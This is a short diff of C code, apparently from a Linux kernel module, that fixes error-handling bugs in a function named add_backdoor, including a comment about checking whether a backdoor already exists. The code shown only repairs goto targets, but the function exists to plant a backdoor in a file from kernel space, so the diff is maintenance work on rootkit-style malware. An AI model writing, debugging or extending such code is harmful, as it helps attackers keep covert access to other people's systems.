@@ -88,7 +88,8 @@ int add_backdoor(char *path) {
 	    	set_fs(old_fs); 
 
 	    	if(IS_ERR(file)){
-			return 0;
+			goto exit;
+// 			return 0;
 	    	}
 
 	    	//check if backdoor already exists
@@ -114,7 +115,7 @@ int add_backdoor(char *path) {
 
 			if(ret < 0){
 				
-				goto cleanup 2;
+				goto cleanup2;
 // 		    		if(buffer)
 // 					{kfree(buffer);}
 // 		    	if(file)
